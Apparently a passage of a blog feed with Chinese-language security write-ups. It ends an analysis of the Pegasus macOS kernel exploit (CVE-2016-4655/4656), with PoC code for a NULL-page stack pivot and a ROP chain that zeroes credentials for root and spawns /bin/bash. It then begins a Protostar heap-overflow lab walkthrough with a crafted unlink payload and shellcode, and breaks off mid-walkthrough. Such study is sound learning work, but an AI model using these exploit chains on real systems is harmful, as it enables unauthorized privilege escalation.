src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/pic/0-1.png?raw=true" alt="0-1"><br>意思就是我们可以将__PAGEZERO段重新映射为可用段，就可以将ROP链布置上去。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mach_vm_address_t null_map = 0;</div><div class="line"></div><div class="line">vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE);</div><div class="line"></div><div class="line">kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0);</div><div class="line">if (kr != KERN_SUCCESS)</div><div class="line">    return;</div></pre></td></tr></table></figure><p>这段代码即禁用__PAGEZERO段和Map NULL，要达到目的，我们需要将二进制文件编译为32位，并包含pagezero_size,0标志  </p><h3 id="Pivoting-stack和ROP链"><a href="#Pivoting-stack和ROP链" class="headerlink" title="Pivoting stack和ROP链"></a>Pivoting stack和ROP链</h3><p>下面的这部分内容和我之前分析的linux ROP技术类似，利用ret指令将栈中的地址pop到rip达到执行任意代码的目的。若不清楚，移步<a href="https://null-me.github.io/2017/04/13/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/" target="_blank" rel="external">Protostar-栈溢出学习-覆盖栈函数指针和ret指令控制eip</a><br>首先将rip转移到0x20处</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot</div></pre></td></tr></table></figure><p>然后通过交换rsp和eax值，将rip转移到0x00位置处，这一步的目的即在__PAGEZERO段上控制栈结构，因为每是将rsp的值pop到ret中，这也就是stack pivot技术。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">uint64_t *transfer = (uint64_t *)0x0;</div><div class="line">transfer[0] = ROP_POP_RSP(map);</div><div class="line">transfer[1] = (uint64_t)chain-&gt;chain;</div></pre></td></tr></table></figure><p>接着rip转移到<code>main-&gt;chain</code>，和前面一样ROP链一样，不过主链是为了达到提权的目的。<br>主链的代码  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">rop_chain_t *chain = calloc(1, sizeof(rop_chain_t));</div><div class="line"></div><div class="line">PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_current_proc&quot;));</div><div class="line"></div><div class="line">PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);</div><div class="line">PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_proc_ucred&quot;));</div><div class="line"></div><div class="line">PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);</div><div class="line">PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_posix_cred_get&quot;));</div><div class="line"></div><div class="line">PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);</div><div class="line">PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3));</div><div class="line">PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_bzero&quot;));</div><div class="line"></div><div class="line">PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_thread_exception_return&quot;));</div></pre></td></tr></table></figure><p>主链的执行过程其实原理并不复杂：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">chain prototype:</div><div class="line">  </div><div class="line">proc = current_proc();//找到当前程序的credentials结构</div><div class="line">ucred = proc_ucred(proc);</div><div class="line">posix_cred = posix_cred_get(ucred);</div><div class="line"></div><div class="line">bzero(posix_cred, (sizeof(int) * 3));//将组id设为0即提权为root</div><div class="line">thread_exception_return();//thread_exception_return只是让我们离开内核区域而不会panic，通常用于从内核陷阱返回。</div></pre></td></tr></table></figure><p>接下来的代码和之前一样，测试我们构造的dic是否有效：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">host_get_io_master(mach_host_self(), &amp;master); // get iokit master port</div><div class="line"></div><div class="line">kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);</div><div class="line">if (kr != KERN_SUCCESS)</div><div class="line">    return;</div></pre></td></tr></table></figure><p>最后如果一切都顺利，我们检查当前进程<code>getuid</code>是否等于0，如果是就提权root成功，然后调用<code>system(&quot;/bin/bash&quot;)</code>弹出一个shell！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if (getuid() == 0) &#123;</div><div class="line">    puts(&quot;(+) got r00t!&quot;);</div><div class="line">    system(&quot;/bin/bash&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>测试：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/pic/0-2.png?raw=true" alt="0-2"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>终于完了，如果认真的一步步分析过来，相信你一定有很多收获和感悟。谁不一样呢？当我一步步的咬着英文看了太多资料和别人的分析，当不熟悉一个领域的时候，会感到害怕，烦躁，困惑。当然在这之中，特别感谢看雪iOS安全小组的<a href="http://turingh.github.io/2016/09/07/CVE-2016-4656%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/" target="_blank" rel="external">黄大大</a>和<a href="http://blog.imjun.net/posts/restore-symbol-of-iOS-app/" target="_blank" rel="external">杨君大大</a>，给我了解答了很多困惑，很是感动。从准备分析到写完这篇文章，连续花了7天时间，庆幸自己坚持下来，学到了很多之前都不了解的技术。在分析这个漏洞及利用的时候，我才发现把之前学的linux堆栈漏洞的各个知识点都串了起来，包括-堆管理原理，ROP，UAF，Vtable等等等等。也印证了今天在微博上看到教主的那句话：<br><strong>学好书不求甚解，爱技术不论用处</strong>，当我去用之前所学去理解一个个知识点的时候才体会到后半句：<strong>每有会意便欣然忘食</strong></p><p><strong>PoC</strong><br>完整的Poc代码在<a href="https://github.com/NULL-ME/PegasusX">这里</a></p><p><strong>特别感谢</strong></p><ul><li><a href="http://turingh.github.io/2016/09/07/CVE-2016-4656%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/" target="_blank" rel="external">mrh</a> –这是黄大大的分析，黄大大是一个特别严谨细致的人，分析文章使人豁然开朗</li><li><a href="https://jndok.github.io/2016/10/04/pegasus-writeup/" target="_blank" rel="external">jndok’s blog</a> –本文大多基于jndok的分析，可以去看看原文的分析</li><li><a href="http://blog.imjun.net/posts/restore-symbol-of-iOS-app/" target="_blank" rel="external">杨君的小黑屋</a>–杨君大大特别有耐心，执着于技术，乐于分享技术</li></ul><p><strong>参考</strong><br>1.<a href="https://developer.apple.com/library/content/samplecode/SimpleUserClient/Listings/User_Client_Info_txt.html" target="_blank" rel="external">User Client Info.txt</a><br>2.<a href="https://www.blackhat.com/docs/eu-15/materials/eu-15-Todesco-Attacking-The-XNU-Kernal-In-El-Capitain.pdf" target="_blank" rel="external">Attacking-The-XNU-Kernal-In-El-Capitain</a><br>3.<a href="https://bazad.github.io/2016/05/mac-os-x-use-after-free/" target="_blank" rel="external">Mac OS X Privilege Escalation via Use-After-Free: CVE-2016-1828</a><br>4.<a href="http://ho.ax/downloads/Defiling-Mac-OS-X-Ruxcon.pdf" target="_blank" rel="external">Defiling-Mac-OS-X-Ruxcon</a><br>5.<a href="https://www.exploit-db.com/exploits/39925/" target="_blank" rel="external">Apple Mac OSX Kernel - Exploitable NULL Dereference in CoreCaptureResponder Due to Unchecked Return Value</a><br>6.<a href="http://www.cnblogs.com/huxiao-tee/p/4660352.html" target="_blank" rel="external">认真分析mmap：是什么 为什么 怎么用</a><br>7.<a href="http://ho.ax/posts/2012/02/resolving-kernel-symbols/" target="_blank" rel="external">Resolving kernel symbols</a>  </p><p><strong>OSUnserializeBinary源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div></pre></td><td class="code"><pre><div class="line">OSObject *</div><div class="line">OSUnserializeBinary(const char *buffer, size_t bufferSize, OSString **errorString)</div><div class="line">&#123;</div><div class="line">OSObject ** objsArray;</div><div class="line">uint32_t    objsCapacity;</div><div class="line">uint32_t    objsIdx;</div><div class="line"></div><div class="line">OSObject ** stackArray;</div><div class="line">uint32_t    stackCapacity;</div><div class="line">uint32_t    stackIdx;</div><div class="line"></div><div class="line">    OSObject     * result;</div><div class="line">    OSObject     * parent;</div><div class="line">    OSDictionary * dict;</div><div class="line">    OSArray      * array;</div><div class="line">    OSSet        * set;</div><div class="line">    OSDictionary * newDict;</div><div class="line">    OSArray      * newArray;</div><div class="line">    OSSet        * newSet;</div><div class="line">    OSObject     * o;</div><div class="line">    OSSymbol     * sym;</div><div class="line"></div><div class="line">    size_t           bufferPos;</div><div class="line">    const uint32_t * next;</div><div class="line">    uint32_t         key, len, wordLen;</div><div class="line">    bool             end, newCollect, isRef;</div><div class="line">    unsigned long long value;</div><div class="line">    bool ok;</div><div class="line"></div><div class="line">if (errorString) *errorString = 0;</div><div class="line">if (0 != strcmp(kOSSerializeBinarySignature, buffer)) return (NULL);</div><div class="line">if (3 &amp; ((uintptr_t) buffer)) return (NULL);</div><div class="line">if (bufferSize &lt; sizeof(kOSSerializeBinarySignature)) return (NULL);</div><div class="line">bufferPos = sizeof(kOSSerializeBinarySignature);</div><div class="line">next = (typeof(next)) (((uintptr_t) buffer) + bufferPos);</div><div class="line"></div><div class="line">DEBG(&quot;---------OSUnserializeBinary(%p)\n&quot;, buffer);</div><div class="line"></div><div class="line">objsArray = stackArray    = NULL;</div><div class="line">objsIdx   = objsCapacity  = 0;</div><div class="line">stackIdx  = stackCapacity = 0;</div><div class="line"></div><div class="line">    result   = 0;</div><div class="line">    parent   = 0;</div><div class="line">dict     = 0;</div><div class="line">array    = 0;</div><div class="line">set      = 0;</div><div class="line">sym      = 0;</div><div class="line"></div><div class="line">ok = true;</div><div class="line">while (ok)</div><div class="line">&#123;</div><div class="line">bufferPos += sizeof(*next);</div><div class="line">if (!(ok = (bufferPos &lt;= bufferSize))) break;</div><div class="line">key = *next++;</div><div class="line"></div><div class="line">        len = (key &amp; kOSSerializeDataMask);</div><div class="line">        wordLen = (len + 3) &gt;&gt; 2;</div><div class="line">end = (0 != (kOSSerializeEndCollecton &amp; key));</div><div class="line">        DEBG(&quot;key 0x%08x: 0x%04x, %d\n&quot;, key, len, end);</div><div class="line"></div><div class="line">        newCollect = isRef = false;</div><div class="line">o = 0; newDict = 0; newArray = 0; newSet = 0;</div><div class="line"></div><div class="line">switch (kOSSerializeTypeMask &amp; key)</div><div class="line">&#123;</div><div class="line">    case kOSSerializeDictionary:</div><div class="line">o = newDict = OSDictionary::withCapacity(len);</div><div class="line">newCollect = (len != 0);</div><div class="line">        break;</div><div class="line">    case kOSSerializeArray:</div><div class="line">o = newArray = OSArray::withCapacity(len);</div><div class="line">newCollect = (len != 0);</div><div class="line">        break;</div><div class="line">    case kOSSerializeSet:</div><div class="line">o = newSet = OSSet::withCapacity(len);</div><div class="line">newCollect = (len != 0);</div><div class="line">        break;</div><div class="line"></div><div class="line">    case kOSSerializeObject:</div><div class="line">if (len &gt;= objsIdx) break;</div><div class="line">o = objsArray[len];</div><div class="line">o-&gt;retain();</div><div class="line">isRef = true;</div><div class="line">break;</div><div class="line"></div><div class="line">    case kOSSerializeNumber:</div><div class="line">bufferPos += sizeof(long long);</div><div class="line">if (bufferPos &gt; bufferSize) break;</div><div class="line">    value = next[1];</div><div class="line">    value &lt;&lt;= 32;</div><div class="line">    value |= next[0];</div><div class="line">    o = OSNumber::withNumber(value, len);</div><div class="line">    next += 2;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case kOSSerializeSymbol:</div><div class="line">bufferPos += (wordLen * sizeof(uint32_t));</div><div class="line">if (bufferPos &gt; bufferSize)           break;</div><div class="line">if (0 != ((const char *)next)[len-1]) break;</div><div class="line">        o = (OSObject *) OSSymbol::withCString((const char *) next);</div><div class="line">        next += wordLen;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case kOSSerializeString:</div><div class="line">bufferPos += (wordLen * sizeof(uint32_t));</div><div class="line">if (bufferPos &gt; bufferSize) break;</div><div class="line">        o = OSString::withStringOfLength((const char *) next, len);</div><div class="line">        next += wordLen;</div><div class="line">        break;</div><div class="line"></div><div class="line">        case kOSSerializeData:</div><div class="line">bufferPos += (wordLen * sizeof(uint32_t));</div><div class="line">if (bufferPos &gt; bufferSize) break;</div><div class="line">        o = OSData::withBytes(next, len);</div><div class="line">        next += wordLen;</div><div class="line">        break;</div><div class="line"></div><div class="line">        case kOSSerializeBoolean:</div><div class="line">o = (len ? kOSBooleanTrue : kOSBooleanFalse);</div><div class="line">        break;</div><div class="line"></div><div class="line">    default:</div><div class="line">        break;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if (!(ok = (o != 0))) break;</div><div class="line"></div><div class="line">if (!isRef)</div><div class="line">&#123;</div><div class="line">setAtIndex(objs, objsIdx, o);</div><div class="line">if (!ok) break;</div><div class="line">objsIdx++;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if (dict)</div><div class="line">&#123;</div><div class="line">if (sym)</div><div class="line">&#123;</div><div class="line">DEBG(&quot;%s = %s\n&quot;, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());</div><div class="line">if (o != dict) ok = dict-&gt;setObject(sym, o);</div><div class="line">o-&gt;release();</div><div class="line">sym-&gt;release();</div><div class="line">sym = 0;</div><div class="line">&#125;</div><div class="line">else </div><div class="line">&#123;</div><div class="line">sym = OSDynamicCast(OSSymbol, o);</div><div class="line">ok = (sym != 0);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">else if (array) </div><div class="line">&#123;</div><div class="line">ok = array-&gt;setObject(o);</div><div class="line">    o-&gt;release();</div><div class="line">&#125;</div><div class="line">else if (set)</div><div class="line">&#123;</div><div class="line">   ok = set-&gt;setObject(o);</div><div class="line">   o-&gt;release();</div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">    assert(!parent);</div><div class="line">    result = o;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if (!ok) break;</div><div class="line"></div><div class="line">if (newCollect)</div><div class="line">&#123;</div><div class="line">if (!end)</div><div class="line">&#123;</div><div class="line">stackIdx++;</div><div class="line">setAtIndex(stack, stackIdx, parent);</div><div class="line">if (!ok) break;</div><div class="line">&#125;</div><div class="line">DEBG(&quot;++stack[%d] %p\n&quot;, stackIdx, parent);</div><div class="line">parent = o;</div><div class="line">dict   = newDict;</div><div class="line">array  = newArray;</div><div class="line">set    = newSet;</div><div class="line">end    = false;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if (end)</div><div class="line">&#123;</div><div class="line">if (!stackIdx) break;</div><div class="line">parent = stackArray[stackIdx];</div><div class="line">DEBG(&quot;--stack[%d] %p\n&quot;, stackIdx, parent);</div><div class="line">stackIdx--;</div><div class="line">set   = 0; </div><div class="line">dict  = 0; </div><div class="line">array = 0;</div><div class="line">if (!(dict = OSDynamicCast(OSDictionary, parent)))</div><div class="line">&#123;</div><div class="line">if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent)));</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">DEBG(&quot;ret %p\n&quot;, result);</div><div class="line"></div><div class="line">if (objsCapacity)  kfree(objsArray,  objsCapacity  * sizeof(*objsArray));</div><div class="line">if (stackCapacity) kfree(stackArray, stackCapacity * sizeof(*stackArray));</div><div class="line"></div><div class="line">if (!ok &amp;&amp; result)</div><div class="line">&#123;</div><div class="line">result-&gt;release();</div><div class="line">result = 0;</div><div class="line">&#125;</div><div class="line">return (result);</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面&quot;&gt;&lt;/a&gt;0x00 写在前面&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 不知道为什么，刚开始就有很多话想说。因为看似是本文开始，
      
    
    </summary>
    
      <category term="iOS&amp;macOS内核漏洞分析" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOS-macOS%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PoC分析" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOS-macOS%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/PoC%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Pegasus" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Pegasus/"/>
    
      <category term="cve" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/cve/"/>
    
      <category term="CVE-2016-4655" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CVE-2016-4655/"/>
    
      <category term="CVE-2016-4656" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CVE-2016-4656/"/>
    
      <category term="PoC" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/PoC/"/>
    
  </entry>
  
  <entry>
    <title>Protostar-堆溢出学习-滥用堆metadata重定向程序执行</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/26/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/26/Protostar-堆溢出系列学习-heap 3/Protostar-堆溢出系列学习-heap 3/</id>
    <published>2017-04-26T13:24:19.000Z</published>
    <updated>2017-05-02T14:35:07.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p> 学习最后一个堆溢出漏洞，在这之前，强烈建议先阅读下我之前对<a href="https://null-me.github.io/2017/04/23/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/" target="_blank" rel="external">linux堆管理DLMalloc的分析</a>这是一个滥用堆metadata导致free()函数造成任意地址写的一个漏洞利用。下面一步一步的分析</p></blockquote><h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">void winner()</div><div class="line">&#123;</div><div class="line">  printf(&quot;that wasn&apos;t too bad now, was it? @ %d\n&quot;, time(NULL));</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv)</div><div class="line">&#123;</div><div class="line">  char *a, *b, *c;</div><div class="line"></div><div class="line">  a = malloc(32);</div><div class="line">  b = malloc(32);</div><div class="line">  c = malloc(32);</div><div class="line"></div><div class="line">  strcpy(a, argv[1]);</div><div class="line">  strcpy(b, argv[2]);</div><div class="line">  strcpy(c, argv[3]);</div><div class="line"></div><div class="line">  free(c);</div><div class="line">  free(b);</div><div class="line">  free(a);</div><div class="line"></div><div class="line">  printf(&quot;dynamite failed?\n&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x02-简单分析-amp-思考"><a href="#0x02-简单分析-amp-思考" class="headerlink" title="0x02 简单分析&amp;思考"></a>0x02 简单分析&amp;思考</h2><p>在这个程序中虽然我们知道有堆溢出的问题，可是堆上并没有什么逻辑上的漏洞，没有可利用的指针？没有UAF漏洞？那怎么才能执行到<code>winner()</code>函数呢？似乎是不可能的事。但通过之前对linux堆管理的分析，可知<code>free()</code>函数中的<code>unlink()</code>函数能够造成一个任意地址写的可能，再像之前那样来修改GOT表，不就是可以执行<code>winner()</code>函数了吗？所以要执行unlink()函数就需要构造两个chunk合并的过程，继而将一个chunk从原来的双链表中unlink下来。<br>就照着这个思路来一步步实现这个过程。</p><h2 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h2><p>1.输入<code>AAAA</code> <code>BBBB</code> <code>CCCC</code>然后free前后后观察堆结构<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-0.png?raw=true" alt="0-0"><br>由上图可得，一共有三个分配的chunk，大小都为29(101001)末位表示前一个chunk正在使用。可以看到最后还有一个很大的chunk，这就是上文所指的topchunk。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-1.png?raw=true" alt="0-1"><br>因为chunk的大小<80字节，所以free后存在单链表的fastbin中，`1-->2–&gt;3–&gt;null`的方式连接  </80字节，所以free后存在单链表的fastbin中，`1--></p><p>2.因为需要unlink一个chunk到双链表bin，所以先覆盖掉第三个chunk让其大小为0x64=100字节。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-2.png?raw=true" alt="0-2"><br>因为我们准备向前合并，所以将preinuse位设为1，即64+1=65</p><p>3.然后还需要构造一个假的chunk让其unlink，这个chunk将精心构造，首先fd=GoT地址 bk=winner地址？等等，这里存在一个问题在于：GoT=winner地址，但winner=GoT在会发生段错误，所以这里有个小技巧在于bk=堆地址，GoT-12=堆地址，然后堆中填上shellcode，去调用winner。<br>构造字符串：<br><code>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x0c\xc0\x04\x08</code><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-3.png?raw=true" alt="0-3"></p><p>4.现在我们需要构造shellcode，因为堆地址+16字节出会写入GoT地址，所以我们的shellcode要足够小，正好我们仅仅需要调用winner而已。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-4.png?raw=true" alt="0-4"><br>这里我们用在线的转换工具下面的汇编转化为x86指令字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov eax,0x8048864</div><div class="line">call eax</div></pre></td></tr></table></figure><p><code>0x8048864</code>为winner()函数地址</p><p>5.将上面的shellcode写入第一个chunk那里，here we hack！<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-5.png?raw=true" alt="0-5"><br>下图可以看到shellcode后面就被填入了GoT地址，也说明了shellcode只能为8字节大小。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-6.png?raw=true" 